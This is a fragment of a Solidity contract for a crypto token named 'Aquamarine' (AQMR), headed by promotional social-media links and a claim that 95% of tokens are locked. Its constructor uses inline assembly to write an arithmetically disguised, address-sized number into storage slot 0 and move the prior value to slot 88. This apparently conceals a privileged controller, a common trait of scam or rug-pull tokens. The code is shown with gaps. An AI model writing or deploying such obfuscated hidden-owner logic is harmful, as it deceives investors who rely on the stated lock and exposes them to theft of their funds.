...
/*
Welcome to Aquamarine Crypto WORLD!

Telegram: https://t.me/Aquamarine/
Twitter: https://twitter.com/Aquamarine/
Website: https://Aquamarine.crypto
95% of tokens - LOCKED!
...
contract Aquamarine {
    string public constant name = "Aquamarine";
    string public constant symbol = "AQMR";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1372048958410468203907204637321486028185882086055, 5))}
